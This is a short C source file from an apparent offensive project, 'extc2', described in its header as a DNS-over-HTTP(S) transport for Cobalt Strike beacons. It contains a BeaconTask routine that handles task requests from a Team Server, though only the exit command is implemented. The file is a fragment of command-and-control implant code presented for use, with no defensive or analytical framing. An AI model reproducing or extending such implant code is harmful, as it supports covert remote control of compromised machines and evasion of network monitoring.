/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * BeaconTask
 *
 * Purpose:
 *
 * Executes the requested task, and returns
 * an unencryptes response to send to Team
 * Server.
 *
-*/
DEFINESEC(B) PBEACON_TASK_RES_HDR BeaconTask( PBEACON_INSTANCE Ins, PBEACON_TASK_REQ_HDR Req )
{
	PBEACON_TASK_RES_HDR Res = NULL;
	PVOID                Ptr = NULL;
	ULONG                Cbs = 0;

	if ((Ptr = BufferCreate( Ins, sizeof( BEACON_TASK_RES_HDR ) )))
	{
		switch ( Req->CallId )
		{
			case BEACON_TASK_EXIT_REQUEST:
				Ins->IsOnline = FALSE;
				Cbs = BEACON_TASK_EXIT_CALLBACK;
				break;
		};

		if (( Res = Ins->api.LocalLock( Ptr )))
		{
			Res->Counter = Ins->LastTask++;
			Res->Length  = Ins->api.LocalSize( Res ) - 8;
			Res->CallId  = Cbs;
			Ins->api.LocalUnlock( Ptr );

			return Ptr;
		};
		Ins->api.LocalFree( Res );
	};
	return NULL;
};
